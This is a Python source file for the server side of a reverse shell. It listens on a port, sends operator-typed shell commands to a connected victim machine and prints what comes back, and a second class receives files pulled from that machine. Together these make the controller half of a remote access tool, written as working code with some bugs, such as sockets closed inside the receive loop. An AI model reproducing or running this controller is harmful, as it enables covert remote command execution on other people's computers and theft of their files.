#-*- coding: utf-8 -*-

import socket
import os
import subprocess
import sys
import tqdm

from termcolor import colored as c

class Server(object):

	client_socket = None
	client_address = None
	cwb = None

	def __init__(self):
		self.SERVER_HOST = "0.0.0.0"
		self.SERVER_PORT = 5003
		self.BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
		# separator string for sending 2 messages in one go
		self.SEPARATOR = "<sep>"
		# create a socket object
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	def bind(self):
		# bind the socket to all IP addresses of this host
		self.s.bind((self.SERVER_HOST, self.SERVER_PORT))

	def listen(self):
		self.s.listen(5)
		return print(c(f"Listening as {self.SERVER_HOST}:{self.SERVER_PORT} ...", 'green'))

	def accept(self):
		# accept any connections attempted
		self.client_socket, self.client_address = self.s.accept()
		print(f"{self.client_address[0]}:{self.client_address[1]} Connected!")

	def check(self):
		# receiving the current working directory of the client
		self.cwd = self.client_socket.recv(self.BUFFER_SIZE).decode()
		print(c("[+] Current working directory:", 'green'), self.cwd)

	def build(self, host, port):
		self.SERVER_HOST = host
		self.SERVER_PORT = port

	def run(self):
		self.bind()
		self.listen()
		self.accept()
		self.check()

		while True:
			# get the command from prompt
			command = input(f"{self.cwd} $> ")
			if not command.strip():
				# empty command
				continue

			# send the command to the client
			self.client_socket.send(command.encode())
			if command.lower() == "exit":
				# if the command is exit, just break out of the loop
				break
			# retrieve command results
			output = self.client_socket.recv(self.BUFFER_SIZE).decode()
			# split command output and current directory
			results, cwd = output.split(self.SEPARATOR)
			# print output
			print(results)
       
class ServerFileTransfer(Server):
    
	# create the server socket
	# TCP socket
	s = socket.socket()

	# Progress the size
	progress = None

	def __init__(self):
		# device's IP address
		self.SERVER_HOST = "0.0.0.0"
		self.SERVER_PORT = 5001
		# receive 4096 bytes each time
		self.BUFFER_SIZE = 4096
		self.SEPARATOR = "<SEPARATOR>"
		
	def receive_file_size(self, file, size):
		# receive the file infos
		# receive using client socket, not server socket
		received = self.client_socket.recv(self.BUFFER_SIZE).decode()

		filename, filesize = received.split(self.SEPARATOR)
		# remove absolute path if there is
		filename = os.path.basename(filename)
		# convert to integer
		filesize = int(filesize)

		# start receiving the gile from the socket
		# and writing to the file stream
		self.progress = tqdm.tqdm(range(filesize))
		with open(filename, "wb") as f:
			while True:
				# read 1024 bytes from the socket (receive)
				bytes_read = self.client_socket.recv(self.BUFFER_SIZE)
				if not bytes_read:
					# nothing is received
					# file transmitting is done
					break
				# write to the file the bytes we just received
				f.write(bytes_read)
				# update the progress bar
				self.progress.update(len(bytes_read))

				# close the client socket
				self.client_socket.close()
				# close the server socket
				self.s.close()
